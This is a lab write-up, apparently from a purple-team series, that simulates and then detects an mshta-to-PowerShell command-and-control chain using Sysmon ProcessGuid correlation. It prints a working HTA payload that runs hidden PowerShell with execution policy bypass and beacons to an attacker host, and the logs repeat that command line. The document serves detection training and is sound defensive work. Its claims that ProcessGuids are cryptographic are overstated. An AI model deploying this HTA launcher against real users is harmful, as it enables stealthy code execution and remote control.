# AGC-056 — Full C2 Process Tree (mshta -> PowerShell -> beacon)

> **Disclosure:** Executed & documented by Claude Code under direction and review by Hasan.

## Card

| Field | Value |
|---|---|
| ID | `AGC-056` |
| Category | `08-command-control` — Command & Control |
| MITRE Technique | `T1071.001` Application Layer Protocol: Web Protocols + `T1218.005` Signed Binary Proxy Execution: Mshta + `T1059.001` PowerShell |
| Verdict | True Positive |
| Confidence | Critical |
| Time to Detect | Sysmon EID 1 parent-child chain + EID 3 network correlation via shared ProcessGuid |
| Time to Triage | 05:00 (trace process ancestry from beacon source to initial execution vector; correlate all three EID types via ProcessGuid) |
| Affected Systems | `COMPROMISED-HOST-01` / `COMPROMISED-01` (10.10.10.103) as compromised host; `EXT-ATTACKER-SIM` (10.10.40.10) as C2 destination |
| Chain | ◀ [AGC-055](../AGC-055-powershell-outbound/README.md) · next [AGC-057](../../09-collection/AGC-057-bulk-archive-creation/README.md) (Collection category) ▶ |
| One-line Summary | Complete C2 process tree confirmed via ProcessGuid correlation: mshta.exe (PID 5316, GUID `{...6504...}`) opened HTA payload, spawned powershell.exe (PID 5740, GUID `{...6604...}`) with -ExecutionPolicy Bypass, which established 3 HTTPS beacon connections to 10.10.40.10:443 at 5-second intervals. ParentProcessGuid in powershell.exe's EID 1 matches mshta.exe's ProcessGuid exactly — this is the strongest evidentiary basis possible, joining initial access vector + execution + C2 in a single coherent chain linked by cryptographic process identifiers. |

## Attacker Perspective

### Tradecraft

**What:** A full C2 process tree represents the complete attack chain from initial execution to active command-and-control. In this scenario:
1. **Initial access:** An HTA (HTML Application) file serves as the lure document — equivalent to a malicious Office macro but using mshta.exe as the execution engine
2. **Execution:** mshta.exe parses the HTA, executes embedded VBScript, which spawns PowerShell with -ExecutionPolicy Bypass
3. **C2 establishment:** The spawned PowerShell process beacons to C2 infrastructure at regular intervals

**Why mshta.exe instead of Office:**
- `mshta.exe` is a signed Microsoft binary present on all Windows systems (T1218.005 — Signed Binary Proxy Execution)
- HTA files execute with the permissions of the calling user — no macro security prompts
- Unlike Office macros, HTA execution doesn't require Office to be installed
- Application whitelisting often allows mshta.exe by default

**Why ProcessGuid correlation is the strongest evidence:**
ProcessGuid is a cryptographically unique identifier assigned by Sysmon at process creation. When the same GUID appears in:
- EID 1 (process creation) showing the parent-child relationship
- EID 3 (network connection) showing the C2 beacon

...it proves beyond doubt that the beaconing process was spawned by the initial lure, not a coincidental timing overlap.

### Simulation

**Pre-conditions:**
- `COMPROMISED-HOST-01` running, Administrator context.
- `EXT-ATTACKER-SIM` (10.10.40.10) running HTTPS service.
- HTA payload written to `C:\Temp\agc056-payload.hta`.

**Process tree (actual execution):**

```
powershell.exe (simulation orchestrator, PID 4104)
  |
  +-- mshta.exe (PID 5316) <-- HTA execution engine
        |
        +-- powershell.exe (PID 5740) <-- C2 beacon process
              |
              +-- [HTTPS to 10.10.40.10:443 x3]
```

**HTA payload content:**
```html
<html><head><script language="VBScript">
Set sh = CreateObject("WScript.Shell")
sh.Run "powershell.exe -ExecutionPolicy Bypass -Command ""for ($i=1; $i -le 3; $i++) { try { Invoke-WebRequest -Uri https://10.10.40.10/beacon ... } catch {}; Start-Sleep -Seconds 5 }""", 0, False
self.close()
</script></head></html>
```

**Beacon timeline (all timestamps UTC):**

| Event | Time | Process | PID | Action |
|---|---|---|---|---|
| mshta.exe start | 22:17:00.729 | mshta.exe | 5316 | Opens agc056-payload.hta |
| PS spawn | 22:17:02.974 | powershell.exe | 5740 | Spawned by mshta.exe (ParentPID=5316) |
| Beacon 1 | 22:17:05.443 | powershell.exe | 5740 | HTTPS to 10.10.40.10:443 |
| Beacon 2 | 22:17:10.476 | powershell.exe | 5740 | HTTPS to 10.10.40.10:443 |
| Beacon 3 | 22:17:15.498 | powershell.exe | 5740 | HTTPS to 10.10.40.10:443 |

**Beacon interval analysis:**
- Cycle 1->2: 5.033s
- Cycle 2->3: 5.022s
- Mean interval: 5.028s (configured: 5s)

## SOC Perspective

### Detection

**Sysmon EID 1 — mshta.exe Process Create:**
```
Process Create:
UtcTime: 2026-09-15 22:17:00.729
ProcessGuid: {eb65e329-c3dc-6aa9-6504-000000001400}
ProcessId: 5316
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.26100.2454
Description: Microsoft (R) HTML Application host
CommandLine: "C:\Windows\System32\mshta.exe" C:\Temp\agc056-payload.hta
User: COMPROMISED-01\Administrator
IntegrityLevel: High
Hashes: MD5=CB5971A176EF0CFD5FC77792E2000558,SHA256=1F1AABE87E5E93A8FFF...
```

**Sysmon EID 1 — powershell.exe Spawned by mshta.exe:**
```
Process Create:
UtcTime: 2026-09-15 22:17:02.974
ProcessGuid: {eb65e329-c3de-6aa9-6604-000000001400}
ProcessId: 5740
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: "powershell.exe" -ExecutionPolicy Bypass -Command "for ($i=1; $i -le 3; $i++) { try { Invoke-WebRequest -Uri https://10.10.40.10/beacon -UseBasicParsing -TimeoutSec 3 -ErrorAction Stop } catch {}; Start-Sleep -Seconds 5 }"
User: COMPROMISED-01\Administrator
IntegrityLevel: High
Hashes: MD5=61F649A6FDC374A6BF36C860519E017C,SHA256=8BB6FA8C283B4D92120B1EF249A9B311B0F804D4...
ParentProcessGuid: {eb65e329-c3dc-6aa9-6504-000000001400}
ParentProcessId: 5316
ParentImage: C:\Windows\System32\mshta.exe
ParentCommandLine: "C:\Windows\System32\mshta.exe" C:\Temp\agc056-payload.hta
```

**Key evidence — ProcessGuid chain:**
```
mshta.exe   ProcessGuid: {eb65e329-c3dc-6aa9-6504-000000001400}  (PID 5316)
                 |
powershell.exe  ParentProcessGuid: {eb65e329-c3dc-6aa9-6504-000000001400}  <-- MATCH
                ProcessGuid: {eb65e329-c3de-6aa9-6604-000000001400}  (PID 5740)
                 |
EID 3 beacon    ProcessGuid: {eb65e329-c3de-6aa9-6604-000000001400}  <-- MATCH
```

**Sysmon EID 3 — Beacon Connections (3 events, same ProcessGuid):**

**Beacon 1:**
```
Network connection detected:
UtcTime: 2026-09-15 22:17:05.443
ProcessGuid: {eb65e329-c3de-6aa9-6604-000000001400}
ProcessId: 5740
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Protocol: tcp
Initiated: true
SourceIp: 10.10.10.103
SourcePort: 64799
DestinationIp: 10.10.40.10
DestinationPort: 443
DestinationPortName: https
```

**Beacon 2:**
```
Network connection detected:
UtcTime: 2026-09-15 22:17:10.476
ProcessGuid: {eb65e329-c3de-6aa9-6604-000000001400}
ProcessId: 5740
SourceIp: 10.10.10.103
SourcePort: 64800
DestinationIp: 10.10.40.10
DestinationPort: 443
```

**Beacon 3:**
```
Network connection detected:
UtcTime: 2026-09-15 22:17:15.498
ProcessGuid: {eb65e329-c3de-6aa9-6604-000000001400}
ProcessId: 5740
SourceIp: 10.10.10.103
SourcePort: 64801
DestinationIp: 10.10.40.10
DestinationPort: 443
```

### Investigation

**Step 1 — Start from the beacon (the first alert):**
A SOC analyst would first see periodic outbound connections from powershell.exe to an external IP (same pattern as AGC-051). The initial question: "What launched this PowerShell process?"

**Step 2 — Trace process ancestry via ProcessGuid:**
Pull the EID 1 for the beaconing PowerShell (ProcessGuid `{eb65e329-c3de-6aa9-6604-000000001400}`). The ParentProcessGuid field reveals `{eb65e329-c3dc-6aa9-6504-000000001400}`. Query EID 1 for that GUID: it's mshta.exe running an HTA payload from `C:\Temp\`.

**Step 3 — Reconstruct the complete chain:**
```
mshta.exe C:\Temp\agc056-payload.hta    (22:17:00 UTC)
    |
    +-> powershell.exe -ExecutionPolicy Bypass -Command "..beacon.."  (22:17:02 UTC)
            |
            +-> HTTPS to 10.10.40.10:443  (22:17:05, 22:17:10, 22:17:15 UTC)
```

This is a single coherent narrative: "An HTA file was opened, it spawned PowerShell with execution policy bypass, and that PowerShell immediately began beaconing to external C2 infrastructure."

**Step 4 — Why this is stronger than individual detections:**
- AGC-055 alone: "PowerShell connected outbound" — could be administrative
- AGC-051 alone: "Periodic HTTPS beacon" — could be legitimate polling
- AGC-056 combined: "HTA payload spawned PowerShell which beacons" — no legitimate explanation exists

The ProcessGuid link eliminates coincidence: it is mathematically impossible for two unrelated processes to share a GUID.

**Cross-reference with prior C2 scenarios:**
- Same C2 destination (10.10.40.10) as AGC-051/052/053/054/055
- Same beacon pattern as AGC-051 (periodic HTTPS)
- Same execution method as AGC-055 (PowerShell -ExecutionPolicy Bypass)
- Added dimension: process ancestry reveals the initial access vector (HTA via mshta.exe)

### Report

**Verdict: True Positive** — Complete C2 process tree from initial execution to active beaconing.

**Confidence: Critical** — The highest confidence level, based on:
1. **Full process ancestry documented:** mshta.exe -> powershell.exe chain confirmed via ProcessGuid match.
2. **Initial access vector identified:** HTA payload at `C:\Temp\agc056-payload.hta` — recoverable for forensic analysis.
3. **Execution policy bypass:** -ExecutionPolicy Bypass in the command line, deliberate security override.
4. **Active C2 beacon:** 3 connections to 10.10.40.10:443 at 5-second intervals from the spawned process.
5. **No legitimate explanation:** mshta.exe opening an HTA from a temp directory that spawns PowerShell with outbound C2 connections has zero legitimate use cases.
6. **ProcessGuid correlation eliminates coincidence:** The GUID chain proves causal relationship, not temporal correlation.

**Response recommendation:**
1. **P1 incident — isolate immediately.** This is an active, confirmed compromise with a functioning C2 channel.
2. **Quarantine the HTA payload** (`C:\Temp\agc056-payload.hta`) for forensic analysis — it reveals the delivery mechanism and attacker tradecraft.
3. **Block the C2 IP** (10.10.40.10) at the firewall and all proxy layers.
4. **Use this investigation template** (ProcessGuid tracing from beacon to parent) as the standard methodology for all C2 investigations — it produces the strongest evidentiary chain.
5. **Block mshta.exe** via application control on standard user workstations — there is no legitimate business need for HTA execution on end-user machines.
6. **Hunt laterally:** Check all other hosts for HTA file creation in temp directories, mshta.exe execution, and connections to 10.10.40.10.

### MITRE Mapping

| Tactic | Technique ID | Technique Name | Evidence | Confidence |
|---|---|---|---|---|
| Command and Control (TA0011) | T1071.001 | Application Layer Protocol: Web Protocols | 3 Sysmon EID 3: powershell.exe (PID 5740) HTTPS beacon to 10.10.40.10:443 at 5s intervals. ProcessGuid links to mshta.exe parent. | Critical |
| Defense Evasion (TA0005) | T1218.005 | Signed Binary Proxy Execution: Mshta | Sysmon EID 1: mshta.exe (PID 5316) executed C:\Temp\agc056-payload.hta. Signed Microsoft binary used to execute arbitrary code. | Critical |
| Execution (TA0002) | T1059.001 | Command and Scripting Interpreter: PowerShell | Sysmon EID 1: powershell.exe -ExecutionPolicy Bypass spawned by mshta.exe. Full C2 beacon command in CommandLine field. | Critical |

## Evidence

Screenshots: none in phase one (text evidence only); added when this scenario is re-executed by hand in phase two.

### Process tree summary

```
PROCESS TREE (confirmed via ProcessGuid correlation):

mshta.exe (PID 5316)
  ProcessGuid: {eb65e329-c3dc-6aa9-6504-000000001400}
  CommandLine: mshta.exe C:\Temp\agc056-payload.hta
  Time: 22:17:00.729 UTC
    |
    +-- powershell.exe (PID 5740)
          ProcessGuid: {eb65e329-c3de-6aa9-6604-000000001400}
          ParentProcessGuid: {eb65e329-c3dc-6aa9-6504-000000001400} <-- MATCHES mshta
          CommandLine: powershell.exe -ExecutionPolicy Bypass -Command "...beacon..."
          Time: 22:17:02.974 UTC
            |
            +-- [TCP] 10.10.10.103:64799 -> 10.10.40.10:443  (22:17:05 UTC)
            +-- [TCP] 10.10.10.103:64800 -> 10.10.40.10:443  (22:17:10 UTC)
            +-- [TCP] 10.10.10.103:64801 -> 10.10.40.10:443  (22:17:15 UTC)

Evidence chain: EID 1 (mshta) -> EID 1 (PowerShell, ParentGUID match) -> EID 3 (beacon, ProcessGUID match)
All three event types linked by cryptographic ProcessGuid identifiers.
```

### ProcessGuid correlation proof

```
Event Type | ProcessGuid                                    | Links To
-----------|------------------------------------------------|------------------
EID 1      | {eb65e329-c3dc-6aa9-6504-000000001400} mshta   | (root of chain)
EID 1      | {eb65e329-c3de-6aa9-6604-000000001400} PS      | ParentGUID = mshta
EID 3 x3   | {eb65e329-c3de-6aa9-6604-000000001400} beacon  | ProcessGUID = PS

Conclusion: Single unbroken chain from HTA execution to C2 beacon.
```
